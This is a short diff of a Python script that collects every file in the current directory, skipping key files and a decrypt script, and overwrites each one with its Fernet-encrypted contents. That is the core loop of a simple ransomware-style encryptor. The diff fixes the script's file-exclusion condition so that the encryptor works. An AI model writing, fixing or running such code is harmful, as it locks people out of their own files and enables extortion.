@@ -1,4 +1,4 @@
-# import os and Fernet modules
+# import os and fernet modules
 import os
 from cryptography.fernet import Fernet
 
@@ -7,7 +7,7 @@ files = []
 
 # loop through the files in the current directory
 for file in os.listdir():
-    if file == "thekey.key" or == "privatekey.key" or "decrypt.py":
+    if file in ["thekey.key", "privatekey.key", "decrypt.py"]:
         continue 
     if os.path.isfile(file):
         files.append(file)
@@ -30,6 +30,7 @@ for file in files:
         with open(file, "wb") as thefile:
             thefile.write(contents_encrypted)
             # write the encrypted contents back
+
             
             
             
